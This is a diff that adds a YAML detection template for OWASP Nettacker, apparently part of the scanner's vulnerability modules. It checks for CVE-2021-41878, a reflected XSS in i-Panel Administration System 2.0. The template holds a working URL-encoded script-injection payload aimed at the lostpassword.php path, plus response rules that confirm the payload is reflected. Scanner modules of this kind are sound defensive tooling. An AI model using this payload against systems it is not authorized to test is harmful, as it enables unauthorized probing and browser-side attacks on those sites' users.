@@ -1,0 +1,56 @@
+info:
+  name: justwriting_cve_2021_41878_vuln
+  author: OWASP Nettacker Team
+  severity: 6
+  description: A reflected cross-site scripting (XSS) vulnerability exists in the i-Panel Administration System Version 2.0 that enables a remote attacker to execute arbitrary JavaScript code in the browser-based web console.
+  reference: 
+    - https://cybergroot.com/cve_submission/2021-1/XSS_i-Panel_2.0.html
+    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41878
+  profiles:
+    - vuln
+    - vulnerability
+    - http
+    - medium_severity
+    - cve2021
+    - cve
+    - justwriting
+    - xss
+
+payloads:
+  - library: http
+    steps:
+      - method: get
+        verify: false
+        timeout: 3
+        cert: ""
+        stream: false
+        proxies: ""
+        headers:
+          User-Agent: "{user_agent}"
+        allow_redirects: false
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/lostpassword.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              schema:
+                - "http"
+                - "https"
+              ports:
+                - 80
+                - 443
+        response:
+          condition_type: and
+          conditions:
+            status_code:
+              regex: '200'
+              reverse: false
+            header:
+              Content-type: 
+                regex: text/html
+                reverse: false
+            content:
+              regex: <\/script><script>alert\(document\.domain\)<\/script>
+              reverse: false
